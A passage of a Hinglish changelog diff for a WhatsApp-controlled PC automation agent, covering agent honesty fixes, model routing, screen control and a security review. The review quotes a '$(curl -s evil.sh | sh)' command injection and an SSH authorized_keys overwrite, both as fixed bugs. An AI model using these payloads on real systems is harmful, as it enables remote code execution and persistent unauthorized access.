@@ -19,6 +19,736 @@
 
 ---
 
+## 2.1 — `/agent` fix + workload routing (is branch pe)
+
+**Problem jo owner ne report kiya:** `/agent <task>` bina kuch kiye screenshot
+bhej deta tha aur bolta tha "ho gaya" — website bhi nahi khulti thi. Saath hi AI
+har message pe wahi model use karta tha (chhote kaam ke liye bada model, bade
+kaam ke liye chhota) — power waste aur kam power, dono.
+
+**Root cause (exact):** `commands.js` ka `/agent` hard-coded step list banata tha:
+
+```js
+const task = `open agent | type ${prompt} | key enter | wait 6 | screenshot`;
+return autopilot.runAutopilot(task, ...);
+```
+
+aur `autopilot.runAutopilot()` har haal me `🤖 Autopilot done (N steps)` +
+screenshot return karta tha — chahe `xdg-open` fail ho, chahe browser na khule,
+chahe typing kisi random window me chali jaye. Koi verification nahi thi, aur
+`/agent` khud kuch karta hi nahi tha (kaam kisi doosri website ko de raha tha).
+
+**Fix:**
+
+| File | Change |
+|---|---|
+| `src/router.js` (naya) | task ko tiny/light/standard/heavy me size karta hai; model catalog (local + free cloud) quality/speed/cost ke saath; cooldown + hourly heavy budget; `/brains` text |
+| `src/agentloop.js` | router se model order; tier ke hisaab se steps/tools; fail hone pe agla (bada) brain; same tool call repeat detect; `lastRun` me model/tier/steps |
+| `src/ai.js` | chat/complete bhi router se; photos vision-capable model ko (local pehle, phir Gemini) |
+| `src/autopilot.js` | `open` ab naya window aane ka wait karta hai (wmctrl; Wayland pe screen-diff), `type` galat window me nahi karta, tap sirf OCR/vision (blind coordinates off), har step ok/fail, fail pe "step N pe ruk gaya" |
+| `src/commands.js` | `/agent` = real task, `--plan/--web/--fast/--deep`; naya `/brains`; `/arena` purana shortcut alag se; `/do` same engine |
+| `src/imaging.js` | `imageSignature` / `imageSimilarity` / `screenChanged` — "screen badla ya nahi" |
+| `src/apps.js` | `windowTitles()` — automation ko verify karne ke liye |
+| `src/pccontrol.js` | URL open: xdg-open → gio → firefox/chromium/chrome/brave chain, saaf error |
+| `src/config.js` + `.env.example` | model sizes, `ROUTER_PREFER`, cooldowns, `MAX_HEAVY_PER_HOUR`, `AI_TIMEOUT_MS`, `ALLOW_BLIND_CLICKS=false` |
+| `src/server.js` | `GET /api/brains` + `/api/status` me brains list |
+
+**Verification (offline tests, 69 pass):**
+
+- `/agent` with no brain → "kuch bhi nahi kiya", **no screenshot**
+- failed `open` → `step 1/1 pe ruk gaya`, **not** "done"
+- model ne bina tool call ke "ho gaya" bola → loop nudge karke asli tool call karwata hai
+- nudge ke baad bhi bina tool "ho gaya" → reply: "Kuch nahi hua… main use sach nahi maanta" (fabricated success kabhi accept nahi)
+- tiny task → local fast model; standard → capable model; local 14B ho to local
+- failing brain → cooldown; heavy budget → standard pe downgrade
+- `screenshot bhej do` → vision model **nahi** maangta
+
+---
+
+## 2.2 — sab kuch local (Hugging Face + llama.cpp)
+
+Owner ne bola: "mereko sab local chahiye, aaj kal acche models aa rahe hain,
+Hugging Face se download command de do, local run karunga."
+
+Kya bana:
+
+| Cheez | Kahan |
+|---|---|
+| Naya provider `local` (OpenAI-compatible: llama.cpp / LM Studio / vLLM) | `src/router.js`, `src/ai.js`, `src/agentloop.js` |
+| Config: `AI_PROVIDER=local`, `LOCAL_API_URL`, `LOCAL_MODEL`, `_SMALL/_HEAVY/_VISION` | `src/config.js`, `.env.example` |
+| Download + serve + wire + systemd, ek script se | `scripts/local-models.sh` |
+| Guide: kaunsa model kis RAM pe, exact `hf download` commands, quants | `LOCAL-MODELS.md` |
+| `/doctor` + `/model` me local server check | `src/doctor.js`, `src/ai.js` |
+| Tests (fake llama-server): tools, chat, vision, dead server | `test/local.test.js` (9) |
+
+Model shortlist (Oct 2026, Hugging Face pe verified):
+
+- `unsloth/Qwen3.8-27B-GGUF` — best overall, vision + agentic, UD-Q4_K_XL ~17.9 GB
+- `ggml-org/gemma-4-26B-A4B-it-GGUF` — MoE (4B active), CPU laptop ka best
+- `unsloth/gpt-oss-20b-GGUF` — reasoning + tools
+- `ggml-org/gemma-4-12B-it-GGUF` — vision + 256K ctx, 7.4 GB
+- `unsloth/Qwen3.5-4B-GGUF` / `-0.8B-GGUF` — laptop / tiny slot
+
+`AI_PROVIDER=local` = cloud fallback **kabhi nahi**. Photos local vision model
+se, OCR local tesseract se, voice local whisper.cpp se — sab PC pe.
+
+## 2.3 — ek hi script (`observer.sh`)
+
+Owner: "bhai inhe combine karke ek hi script dede." Pehle 8 alag scripts the
+(`install-fresh`, `install-fedora`, `update-from-github`, `local-models`,
+`install-systemd`, `relink-whatsapp`, `setup-remote`, `fix-desktop`) — yaad
+rakhna padta tha kaunsa kab chalana hai. Ab ek file:
+
+```bash
+bash observer.sh <command>
+```
+
+| Command | Purana script | Kya karta hai |
+|---|---|---|
+| `install` | `install-fresh.sh` | tarball curl → `~/observer-agent` → `.env` → `npm install` |
+| `update` | `update-from-github.sh` | backup → code swap → npm → restart (`.env`/`auth_info`/`data` safe) |
+| `models …` | `local-models.sh` | Hugging Face GGUF: list/recommend/detect/download/serve/wire/setup/ollama/status |
+| `service …` | `install-systemd.sh` | systemd unit install/restart/status/logs/enable/disable/uninstall |
+| `relink` | `relink-whatsapp.sh` | naya QR |
+| `remote` | `setup-remote.sh` | Tailscale se phone app bahar se |
+| `fix` | `fix-desktop.sh` | screenshot/keyboard/mouse (Wayland) |
+| `doctor` | — | kya toota + exact fix |
+| `start` / `version` / `help` | — | foreground run, local vs remote version, help |
+
+Purane teen user-facing naam ab **thin wrappers** hain jo `observer.sh` ko
+forward karte hain (`--fresh <dir>` bhi `install --dir` me translate hota hai).
+Koi git nahi — script khud tarball `curl` karta hai.
+
+Bug jo testing me mila: `trap 'rm -rf "$tmp"' EXIT` + `set -u` → function ke
+baad `tmp` local scope se bahar chala jata tha, script exit pe
+`line 1: tmp: unbound variable` deta tha (aur temp folder delete nahi hota).
+Fix: `trap "rm -rf '$tmp'" EXIT` (value trap lagte waqt hi expand ho jati hai).
+
+## 2.8.2 — screenshot auto-delete
+
+Owner: "jo screenshot kheech ke bhej chuka hota hai uska use nahi hota — 2 ya 5
+minute me khud delete ho jaye."
+
+### Pehle kya hota tha
+
+- `captureScreenshot()` har baar `<tmp>/observer-shot-<ts>.png` banata tha aur
+  **success pe bhi delete nahi karta tha** — /tmp me screenshot jama hote rehte.
+- Wayland portal asli screenshot `~/Pictures` me likhta hai. Hum use padh ke
+  bhej dete the, file padi rehti — hamesha ke liye.
+
+### Ab (`src/screenshots.js`)
+
+| File | Kab delete |
+|---|---|
+| `<tmp>/observer-shot-<ts>.png` | **turant**, buffer padhne ke baad (leak hi nahi) |
+| `~/Pictures/Screenshot*.png` (portal ne likhi, humne padhi) | TTL ke baad — default **4 min**, 30s check |
+| Crash se bachi `observer-shot-*.png` | TTL ke baad, naam se sweep |
+
+- TTL: `SCREENSHOT_TTL_MINUTES=4` (2–5 recommended; 1–30 hard clamp). Off:
+  `SCREENSHOT_CLEANUP=false`.
+- Ledger `data/shots.json` — restart ke baad bhi purani captured file clean hoti hai.
+- **Safety**: sirf wahi paths delete hote hain jo agent ne khud capture kiye
+  (`observer-shot-*.png` temp me, ya portal ki likhi file pictures folder me).
+  Owner ki apni files, downloads, shared, recordings, webcam — chhoote hi nahi.
+  Folder ke bahar ka path ledger me aa jaye to ignore.
+- `/shots` — TTL + kitni files padi hain · `/shots clean` — abhi saaf.
+- Janitor fail ho to sirf warn, agent nahi girta; shutdown pe bhi ek aakhri safai.
+
+### Files
+
+| File | Kya |
+|---|---|
+| `src/screenshots.js` | *naya* — TTL, ledger, sweep, janitor, /shots report |
+| `src/pccontrol.js` | temp copy turant delete, portal file track |
+| `src/commands.js` | `/shots`, `/shots clean`, HELP |
+| `src/index.js` | janitor start/stop |
+| `src/config.js`, `.env.example` | `SCREENSHOT_TTL_MINUTES`, `SCREENSHOT_CLEANUP` |
+| `test/screens.test.js` | *naya* — 10 tests (TTL clamp, restart, sweep, safety, timer, /shots) |
+
+Tests: **182 pass**.
+
+---
+
+
+## 2.8.1 — screen: on-demand frames, aur sab commands wahin
+
+Owner ne seedha pakda: "na har 5–10 sec me screenshot, na har 1 sec — aur
+saare commands bhi chale."
+
+### Kya galat tha
+
+2.8.0 ka Screen tab har **2.5 s** me `/api/screen` maarta tha. Har request pe PC
+screenshot leta hai — Wayland pe har capture portal ka "share your screen"
+prompt bhi la sakta hai. 10 minute ka phone session = ~240 screenshots, bina
+kisi wajah ke.
+
+### Ab
+
+| Trigger | Screenshots |
+|---|---|
+| Tab kholna | 1 |
+| **Refresh** dabana | 1 |
+| Screen pe tap | **0** (frame ka size server yaad rakhta hai) |
+| Tap ke baad naya frame | 1 (dekhne ke liye) |
+| Type / key bhejna | 0 + 1 frame |
+| Kuch na karna | **0** — koi timer nahi |
+
+- `setInterval(loadScreen, 2500)` hata diya. `visibilitychange` pe sirf ek fresh
+  frame (phone wapas aaya to screen badal chuki hogi).
+- `GET /api/screen` ab **ETag** deta hai; same screen pe `304 Not Modified` —
+  image dobara download nahi hoti, page wahi frame rakhta hai.
+- `POST /api/tap` pehle apna screenshot leta tha size jaane ke liye. Ab last
+  frame ka size use karta hai → tap = zero extra capture.
+- Server me `screen` deps inject ho sakte hain, isliye test exactly count karta
+  hai ki ek tap me kitne screenshots hue (0).
+
+### Commands console (Screen tab)
+
+Screen dekhte-dekhte hi sab commands: `/help`, `/brief`, `/usage`, `/watch list`,
+`/undo`, `/use …` — `POST /api/chat` hi hai (same agent, same safety gates),
+bas output screen ke neeche dikhta hai. Screenshot wale commands (`/screenshot`,
+`/look`, `/tap`) ka result image console me aata hai aur screen bhi refresh hoti hai.
+
+Quick chips: `/help · /brief · /usage · /watch list · /undo list · /screenshot · /status`.
+
+### Files
+
+| File | Kya |
+|---|---|
+| `webapp/app.js` | polling hataya, ETag fetch, tap pe 0 capture, console + chips |
+| `webapp/index.html` | Screen tab me Commands card, naya text |
+| `webapp/styles.css` | `.cmd-out` / `.cmd-line` |
+| `src/server.js` | ETag + 304, `screen` deps inject, tap last-frame size se |
+| `test/features.test.js` | 3 naye tests: etag, "tap me 0 screenshot", PC-control off |
+
+Tests: **172 pass**.
+
+---
+
+
+## 2.8.0 — bharosa + poora reach: undo, watch, usage, teach, brief, resume, remote screen
+
+Owner ne kaha: "sab daal de, bas 9 wala step kahin se bhi control hone chahiye."
+2.7.0 ke `/stop` + vision ke upar 10 cheezein, saari local-first.
+
+### 1. `/undo` — galti wapas (`src/journal.js`)
+
+Har file-changing action ka receipt: `data/journal.json` + `data/undo/` me chhote
+backup (max 512 KB). Undo support: write (purana content wapas), delete (backup
+se restore), move (wapas), copy (copy delete), mkdir (khali folder hatao), zip
+(archive delete). 40 entries tak; bade file record hote hain "undo nahi ho
+sakta" — jhooth nahi bolta.
+
+### 2. `/watch` — "jab ye ho jaye to batao" (`src/watch.js`)
+
+Condition + timer → screenshot → vision model → **YES / NO / MAYBE** (strict
+parse, Hinglish "haan" bhi). YES pe screenshot + alert, phir 10 min cooldown
+(condition sach reh jaye to spam nahi). `once` ek baar. 3 fail ke baad watch
+khud band + owner ko batata hai. Store me persist — restart pe bhi zinda.
+
+### 3. `/usage` — quota ka hisaab (`src/usage.js`)
+
+`router.record()` pe hook: har call store me (per model, per din, 14 din).
+`/usage` me aaj ke calls, average latency, provider limits aur 80% pe warning.
+Groq 1000/day/model, OpenRouter 50/day (fresh), Gemini "per-project, AI Studio
+dekho", local unlimited — jo pata nahi use jhooth nahi bolta.
+
+### 4. `/teach` — ek baar karo, hamesha ke liye (`src/macro.js`)
+
+`/teach start morning` → jo commands chalao wo record hoti hain → `/teach stop`
+→ `/morning` pe poora sequence. Sirf successful commands record hoti hain
+(warna replay pe phir fail hoti). Save existing `learned` list me — replay
+wahi tested `runLearned` path hai, naya interpreter nahi.
+
+### 5. `/brief` — din ki tasveer (`src/brief.js`)
+
+Reminders (overdue + aaj), todo, aaj ke cron jobs, active watches, disk,
+battery, uptime, adhoora task. Sab local (`/proc`, store) — zero tokens.
+`/brief on 9am` ek cron job banata hai; cron ab **commands** bhi chala sakta hai
+(`runDueJobs`), isliye scheduled `/brief` bilkul wahi code hai jo manual.
+
+### 6. `/resume` + live progress
+
+Long task shuru hote hi `lastTask` store hota hai; clean finish pe `done`.
+`/stop` ke baad `/resume` wahin se. Saath me `src/progress.js`: hands loop ka
+har step WhatsApp pe "⏳ Hands · step 2/8 · click Search" (7s throttle, send fail
+pe chup-chaap band — task kabhi nahi rukta).
+
+### 7. Photo → diagnosis
+
+"ye error fix karo" caption ke saath photo bhejo: vision pehle error padhta hai,
+phir Hinglish me "kya galat + exact next step". Jo error dikh nahi raha use
+invent nahi karta.
+
+### 8. Kahin se bhi control (step 9)
+
+Teen raaste, teeno free:
+
+| Raasta | Kya milta hai |
+|---|---|
+| WhatsApp (duniya me kahin se) | `/screenshot`, `/tap 500 320`, `/tap Login`, `/pc type`, `/use` |
+| Phone app, same Wi-Fi | naya **Screen** tab: 2.5s live frames, tap-to-click, type box, keys |
+| Tailscale (`observer.sh remote`) | wahi phone app ghar se bahar bhi — koi port forward nahi |
+
+Server routes: `GET /api/screen` (JPEG, token-protected), `POST /api/tap`
+(0-1000 relative ya pixels), `/api/key`, `/api/type`. Sab bridge token ke peeche,
+`ALLOW_PC_CONTROL=false` se band.
+
+### 9. Auto-update
+
+`observer.sh autoupdate on [--time 03:00]` → systemd user timer, raat 3 baje
+(jitter 45 min) update + restart. 2.7.0 ka update message phir WhatsApp pe
+report deta hai (kya naya + kitna time).
+
+### Files
+
+| File | Kya |
+|---|---|
+| `src/journal.js` | *naya* — file op receipts + undo |
+| `src/usage.js` | *naya* — per-model/day quota + report |
+| `src/watch.js` | *naya* — screen-condition watchers |
+| `src/macro.js` | *naya* — /teach recorder + replay |
+| `src/brief.js` | *naya* — daily brief + scheduling |
+| `src/progress.js` | *naya* — throttled live progress |
+| `src/router.js` | `setRecordHook()` — usage ko har call dikhti hai |
+| `src/actions.js` | file ops journaled; `computer_use` live progress |
+| `src/commands.js` | 8 naye commands, resume/teach/brief wiring |
+| `src/server.js` | `/api/screen`, `/api/tap`, `/api/key`, `/api/type` |
+| `webapp/*` | Screen tab (live + tap), key pad, type box |
+| `scripts/observer.sh` | `autoupdate on/off/status` |
+
+Tests: **169 pass** (142 + 27 naye `test/features.test.js`).
+
+---
+
+
+## 2.7.0 — *stop button*, screen ko aankhein, aur update ki khabar
+
+Teen cheezein maangi gayi thi:
+
+1. **Update hone pe WhatsApp message** — kya update hua + kitna time laga.
+2. **`/stop`** — chalta hua kaam *beech me* rukna chahiye, stacked kaam bhi.
+3. **Tez + asli screen reading** — OCR nahi, seedha vision (Gemini ya jo bhi
+   connected API model ho).
+
+### 1. `/stop` — har cheez ke andar ek hi cancel signal
+
+Naya `src/cancel.js`:
+
+```
+StoppedError (code: ESTOPPED)  ─┐
+sleepWith(ms, signal)          ─┼─ ek hi signal poore tree me
+createTaskRegistry()           ─┘   begin/run/stop/stopAll/active/size
+```
+
+- `commands.js` ka `handle()` **sabse pehle** stop-word dekhta hai — dedupe aur
+  "ek kaam chal raha hai" busy-check se bhi pehle. Isliye jab koi command chal
+  raha ho tab bhi `/stop` andar aa jaata hai.
+- `whatsapp.js` me ek batch ke andar pehle `/stop` waale messages process hote
+  hain, baaki queue me rehte hain. Pehle sequential await ki wajah se stop
+  line ke peeche atak jaata tha.
+- Signal `runHands`, `runArenaPrompt`, `agentLoop.run`, `autopilot`, `downloadUrl`,
+  `recordScreen`, `run_shell` — sab tak jaata hai. `curl`/`ffmpeg`/`wf-recorder`
+  child process abort pe mar jaate hain, adhoori download file delete hoti hai.
+- Ruka hua command `null` return karta hai → sirf `/stop` ka reply jaata hai,
+  cancelled kaam ka "⚠️ failed" message nahi.
+- Reply me har task ka label, step count aur seconds: `⏹ *Roka gaya* — 2 task(s)`.
+
+Stop words: `/stop`, `/cancel`, `/abort`, `/ruko`.
+
+### 2. Screen ab OCR nahi — asli vision
+
+Pehle: screenshot → tesseract OCR → word ids → model ko text.
+Ab (`HANDS_USE_OCR=false` default): screenshot → **1024px JPEG q70** →
+vision model khud screen dekhta hai.
+
+- `ai.screenStep()` provider order: **Gemini → Groq (`qwen/qwen3.8-27b`) →
+  OpenRouter (`gemma-4-31b-it:free`) → local llama.cpp → Ollama**.
+  `SCREEN_PROVIDER` se force kar sakte ho.
+- `ALLOW_CLOUD_SCREEN=false` → sirf local/Ollama vision (screenshot PC se bahar
+  nahi jaata).
+- OCR ab **lazy**: sirf tab chalta hai jab text target ko exact pixels pe snap
+  karna ho. Normal coordinate path pe tesseract bilkul nahi chalta.
+- Speed: OCR step hata, image 1024px JPEG (kam tokens, chhota upload),
+  settle 550ms, `HANDS_MAX_TOKENS=512` (pura JSON jawab aata hai).
+
+### 3. Update hone pe message
+
+`src/updates.js` + `observer.sh`:
+
+- `observer.sh update` restart se pehle `data/last-update.json` likhta hai:
+  `{"from":"2.6.0","to":"2.7.0","at":...,"seconds":87,"via":"observer.sh"}`.
+- Jab WhatsApp connect hota hai, `announceUpdate()` version/brain-set badla
+  dekhta hai aur bhejta hai:
+
+```
+🔄 *Observer updated* · 2.6.0 → 2.7.0 · 1m 42s
+• /stop — chalta hua kaam turant rukta hai…
+• Screen ab OCR nahi — screenshot seedha vision model…
+```
+
+- Pehli install pe chup rehta hai (2.7.0 se pehle ka koi message spam nahi).
+- Bhejne me fail hua to version yaad nahi rakhta — agle connect pe dobara try.
+
+### Files
+
+| File | Kya |
+|---|---|
+| `src/cancel.js` | *naya* — StoppedError, sleepWith, task registry |
+| `src/updates.js` | *naya* — update marker, message, announce |
+| `release-notes.json` | *naya* — har version ke bullets (message inhi se banta hai) |
+| `src/commands.js` | `/stop` dispatch, signals, `/status` running line |
+| `src/whatsapp.js` | batch me `/stop` pehle, onConnected hook |
+| `src/actions.js` | har tool me `ctx.signal`, stop = error nahi |
+| `src/hands.js`, `src/ai.js` | vision-first, `screenStep()` provider order |
+| `test/control.test.js` | *naya* — 23 tests (stop, registry, hands abort, updates) |
+
+Tests: **142 pass** (118 + 24 naye).
+
+---
+
+
+## 2.6.0 — *hands*: computer ko insaan ki tarah chalana
+
+Owner ne `main` pe `Agent-S-main.zip` daala (commit `8154afe`, Simular ka
+open-source computer-use agent — Agent-S/S2/S3) aur bola: "is WhatsApp model ke
+paas *actual hands* aa jaane chahiye". Zip padha, architecture samajhi, aur uska
+asar hamare Node agent me utaara.
+
+### Zip me kya tha (aur kya use kiya)
+
+| File | Idea jo adopt ki |
+|---|---|
+| `gui_agents/s3/agents/worker.py` | ek turn = ek action; har step pe screenshot dobara |
+| `gui_agents/s3/agents/grounding.py` | **do tarah ki grounding**: text target word-id se exact, warna model ke relative coordinates (0-1000) |
+| `gui_agents/s3/memory/procedural_memory.py` | strict output format + "jo fail hua dobara mat karo" + done/fail action |
+| `gui_agents/s1/aci/LinuxOSACI.py` | Linux pe actions = mouse/keyboard events, koi API nahi |
+| `gui_agents/s3/bbon/*` | best-of-N — *nahi* liya: free tier pe 8 steps × N rollouts mehnga hai |
+
+Aisa hi nahi kiya: Agent-S Python + `pyautogui` + UI-TARS grounding model maangta
+hai. Uska grounding model free tier pe nahi hai, aur `pyautogui` Wayland pe
+kaam nahi karta. Hamare paas pehle se `pccontrol` (xdotool/ydotool/wtype) hai —
+bas uske upar loop chahiye tha.
+
+### Naya module: `src/hands.js`
+
+```
+screenshot → OCR (local, free) → vision model se EK action (JSON) →
+click / type / scroll / drag → 900ms settle → dobara screenshot → …
+```
+
+- **Word-id grounding**: har OCR word ka id prompt me jaata hai (`12 | Send | 870,940`),
+  model `{"action":"click","word":12}` bolta hai → hum us word ke exact box ke
+  centre pe click karte hain. Icons ke liye `target` + `x,y` (0-1000).
+- **Ek action, ek step** — burst clicking nahi. Agli baar screenshot dekh ke hi
+  agla faisla.
+- **Stuck detection**: wahi action 3 baar + screen nahi badli → run rukta hai
+  (`same action 3 baar, screen nahi badli — stuck`), budget jalane ke bajaye.
+- **Bina kaam kiye "done" nahi maanta**: pehle step pe hi `done` aaya to ek baar
+  poochta hai ("abhi kuch kiya hi nahi") — phir bhi wahi bole to answer me saaf
+  likhta hai `koi action nahi kiya — screen pehle se hi aisi thi`.
+- **Budgets**: 8 steps / 240s default (`HANDS_MAX_STEPS`, `HANDS_MAX_SECONDS`);
+  screenshot 1280px pe downscale (sharp) — Groq/Gemini free-tier image limits ke andar.
+- **Honest output**: har line asli tool result hai; fail pe `❌ reason` + screenshot,
+  kabhi fake "ho gaya" nahi. Reply me model + vision calls + cloud/local note.
+
+### Safety (jaan bujh ke tight)
+
+Action allowlist: `click, double_click, right_click, type, key, scroll, drag,
+move, wait, open, focus, done, fail`. Shell **nahi**. Model ko rules me saaf
+likha hai: password/OTP/card kabhi type nahi, Delete/Uninstall/Logout bina kahe
+nahi. `type` pehle clipboard-paste se jaata hai (unicode/newlines safe), warna
+per-char typing.
+
+### Privacy
+
+Screenshot vision model ko jaata hai. Local vision (`OLLAMA_VISION_MODEL` /
+`LOCAL_API_URL_VISION`) ho to sab PC pe. Nahi ho to free cloud tier (Gemini/Groq)
+dekhta hai — `ALLOW_CLOUD_SCREEN=false` se band, phir hands sirf local vision pe
+chalega. Reply me har baar likha hota hai ki screen kahan gayi.
+
+### Kahan se chalta hai
+
+```bash
+/use YouTube kholo aur lofi music chalao     # direct
+/use --steps 12 Settings me Bluetooth on karo
+/agent instagram kholo aur pehli story dekho # brain khud computer_use tool call karta hai
+/agent --use settings me bluetooth on karo    # heuristic skip, seedha screen control
+```
+
+`computer_use` registry me `standard` level ka tool hai, aur `agentloop` usko
+har request me available rakhta hai (`ALWAYS` list) — kyunki visual kaam sirf
+wahi tool kar sakta hai.
+
+### Naye tests (20)
+
+`test/hands.test.js`: coordinate normalisation (0-1 vs 0-1000 vs pixels), JSON
+nikalna prose/fences se, har action ka parse + clamp, bad/dangerous reply reject
+(`run_shell`), word-id grounding, prompt me word table, loop ke 6 cases (happy
+path, invalid reply retry, model fail, stuck, step budget, screenshot fail),
+`computer_use` tool schema, `/use` ka usage + safe-mode refusal, aur local vision endpoint (LOCAL_API_URL_VISION akela bhi kaam kare).
+
+```bash
+npm test    # 118 pass
+```
+
+---
+
+## 2.5.4 — "page khul gaya phir bhi *page load nahi hua*"
+
+Owner ne screenshot bheja: `/agent arena.ai/agent pe hello likho` → 22s me
+step 1/5 fail:
+
+```
+❌ 1. open "https://arena.ai/agent" → browser khola par page load nahi hua (20s wait)
+```
+
+…jabki page khul gaya tha aur box cursor ke saath **already focused** tha.
+
+### Root cause: "verify nahi hua" ko "fail" samajh liya
+
+`open` step naya window **title** dhoondta tha (`wmctrl -l`). Do wajah se title
+kabhi aata hi nahi:
+
+1. **Wayland** — `wmctrl` X11-only hai, GNOME Wayland pe list khali aati hai.
+2. **Existing browser window** — naya page tab me khulta hai, naya window nahi.
+   Firefox tab ka title badal de to bhi `wmctrl` list me kuch naya nahi hota.
+
+Dono me 20s baad "page load nahi hua" throw hota tha, chahe screen pe page ho.
+Screen-change fallback sirf ek hi branch me chalta tha.
+
+### Fix 1 — teen-value verdict, `openVerdict()`
+
+Naya pure function (`src/autopilot.js`) jo sirf **saaf evidence** pe fail karta hai:
+
+| Observation | Result |
+|---|---|
+| naya window title mila | ✅ proved (`window "…"`) |
+| screen badal gayi | ✅ chala, par `unverified` (screenshot se confirm) |
+| browser pehle band tha, ab chal raha hai | ✅ chala (`unverified`) |
+| browser chal raha hai, title/screen verify possible nahi | ✅ chala (`unverified`) |
+| browser pehle se khula, screen readable thi aur *bilkul nahi badli* | ❌ fail (type karna khatarnaak) |
+| koi browser process hi nahi | ❌ fail |
+
+Isi verdict se `finish()` me line aati hai:
+`ℹ️ 1 step(s) apne aap verify nahi ho paye … browser focus karke aage badha`.
+
+Saath me: `browserRunning()` (`ps -A -o comm=`) aur `focusAnyBrowser()` — verify
+na ho to bhi browser window focus hoti hai, taaki typing composer me jaaye.
+`type` ka safety gate bhi ab "browser focus karke dobara check" karta hai,
+par **non-browser window me typing abhi bhi band** hai.
+
+### Fix 2 — site table: box pehle se focused hai (`src/sites.js`)
+
+Har chat site (Arena, LMArena, ChatGPT, Claude, Gemini, DeepSeek, Grok,
+Perplexity, Kimi, Poe, Copilot, Qwen…) ka profile: `autofocus: true`,
+`readyMs`. Matlab plan ab:
+
+```
+open → type (clipboard) → Enter → wait 8s → look → screenshot
+```
+
+- koi `tap`/`click` step nahi (purana flow blind-click karta tha; OCR galat
+  "Send" pakadta to text sidebar me chala jata),
+- composer pe aimed `tap` step aaye to **skip** hota hai (reason ke saath),
+- 8s wait (20s nahi) — page khula hai to type turant,
+- **ek hi Enter** — pehle `type submit:true` + alag `key enter` dono chalte the
+  (double submit ka risk).
+
+Non-chat sites ka purana behaviour waisa hi hai.
+
+### Fix 3 — `extractPrompt` domain kha raha tha
+
+`arena.ai/agent pe likho hi bro` → typed text `.ai/agent likho hi bro`.
+Domain `arena.ai` sirf aadha strip hota tha kyunki `arena` site-word pehle
+hataya jaata tha. Ab pehle poora domain (`arena.ai/agent`) jaata hai, aur
+cleanup fixpoint tak loop karta hai (trailing `bhejo`/`karo`/`aur` ek saath).
+
+```js
+extractPrompt('arena.ai/agent pe likho hi bro')      // 'hi bro'
+extractPrompt('claude.ai pe likho: explain k8s')     // 'explain k8s'
+extractPrompt('arena.ai/agent pe hello likho aur bhejo') // 'hello'
+```
+
+Verify:
+
+```bash
+npm test    # 98 pass (5 naye tests: sites, steps, domain, verdict x2)
+```
+
+---
+
+## 2.5.3 — code review: teen asli security bugs
+
+Owner ne bola "5-10 minute code check kar". Poora `src/` (10,083 lines) padha,
+path guards fuzz kiye, aur teen cheezein mili jo **tests me nahi pakdi gayi thi**:
+
+### 1. Protected folders sirf read pe block the, **write pe nahi** (serious)
+
+`files.js` me block-list (`~/.ssh`, `~/.gnupg`, `auth_info`, keyrings) sirf
+`mustExist: true` branch me chalti thi. Matlab:
+
+```
+/write ~/.ssh/authorized_keys | ssh-ed25519 AAAA…
+```
+
+…actually kaam karta tha — persistent SSH access. `~/.gnupg/gpg.conf` aur
+WhatsApp creds bhi overwrite ho sakte the. Ab `isBlocked()` dono branches me
+chalti hai (naye file/folder ke parent pe bhi). Regression test added.
+
+### 2. TTS me shell injection (festival engine)
+
+`tts.js` festival ke liye `sh -c "echo … | text2wave -o …"` use karta tha.
+`sanitizeForTTS()` balanced backticks hataata hai par `$(…)` nahi — matlab
+`/voicereply $(curl -s evil.sh | sh)` shell me chalta. Ab `text2wave` ko seedha
+`spawn('text2wave', ['-o', wav], …)` + stdin se text, koi shell nahi.
+
+### 3. Bridge token ka comparison timing-safe nahi tha
+
+`server.js` me token `===` se compare hota tha (LAN pe byte-by-byte timing
+leak). `safeEqual()` file me pehle se maujood thi, bas token pe use nahi ho rahi
+thi. Ab teeno jagah (header, bearer, query) constant-time compare.
+
+Baaki review (jo theek mila): path traversal (`../`, `/etc/passwd`, symlink
+parents) blocked; owner-only gate solid; shell PIN gate; `/api/*` sab token ke
+peeche; `spawn()` sab jagah argv arrays (sirf TTS exception tha).
+
+Verify:
+
+```bash
+npm test    # 93 pass (3 naye tests)
+```
+
+---
+
+## 2.5.2 — `/open` ka fuzzy match kisi bhi bakwaas naam pe app khol deta tha
+
+Owner ke PC pe test fail: `/open definitely-not-an-app-xyz` ne asli app khol di —
+**"Observer App"**. Sandbox me koi .desktop app nahi, isliye wahan test pass
+tha; owner ke Fedora pe Observer installed hai.
+
+**Root cause:** `matchApp()` ka last-resort tier 20 — query ka **koi ek** word
+(>=3 letters) app ke naam ke kisi word se start ho jaye to match. Query ke
+tokens: `definitely not an app xyz` → `app` ne "Observer **App**" pakad liya.
+Matlab koi bhi lamba bakwaas sentence jisme "app" ho, Observer App khol deta.
+
+**Fix:** tier 20 ab sirf chhoti query pe (<= 3 words) chalta hai **aur** tab jab
+aadhe se zyada words match karein. `vs code` / `code` / `app` waise hi kaam
+karte hain; `definitely-not-an-app-xyz` ab "couldn't find an app" deta hai.
+
+```js
+const hits = qTokens.filter((t) => t.length >= 3 && nameTokens.some((n) => n === t || n.startsWith(t)));
+if (hits.length && qTokens.length <= 3 && hits.length >= Math.ceil(qTokens.length / 2)) score = 20;
+```
+
+Regression test: fake list me "Observer App" daal ke `definitely-not-an-app-xyz`
+→ `null`, `not a real app please` → `null`, par `app` → Observer App.
+
+---
+
+## 2.5.1 — test output that names the failure (aur desktop tests hermetic)
+
+Owner ne `observer.sh test` chalaya: 88/90 pass, do fail — par script ne sirf
+`tail -15` dikhaya, jisme failing test ke naam hi nahi the. Aur poora run 43
+second le raha tha (sandbox me 2.4 s).
+
+**Root cause (do cheezein):**
+
+1. `cmd_test` failure par output ka last 15 line print karta tha — TAP me fail
+   ka block upar hota hai. Ab har `not ok` ka **naam + assertion** dikhta hai,
+   aur poora log `~/.cache/observer-agent/last-test.log` me rehta hai.
+2. Tests **asli desktop** ko chhoo rahe the. `captureScreenshot()` Wayland pe
+   pehle `xdg-desktop-portal` try karta hai; asli GNOME session me portal
+   available hota hai, to test jisme `grim` ka black-frame shim check hota hai
+   wo portal path pe chala jata hai (dialog + ~20 s wait) aur fail ho jata hai.
+   Wahi `doctor` test bhi 20 s tak atakta tha → poora suite 43 s.
+   Fix: test process me `DBUS_SESSION_BUS_ADDRESS` ek dead socket pe set —
+   portal genuinely unavailable, jaisa test maanta hai. Production code same.
+
+Verify:
+
+```bash
+./scripts/observer.sh test --live    # ab failing test ka naam + error dikhta hai
+npm test                             # 90 pass, ~2.5s
+```
+
+---
+
+## 2.5 — `observer.sh test` (ek command me poora verification)
+
+Owner ne poocha "ab batao kaise test karun". Do jagah dekhna padta tha (`npm
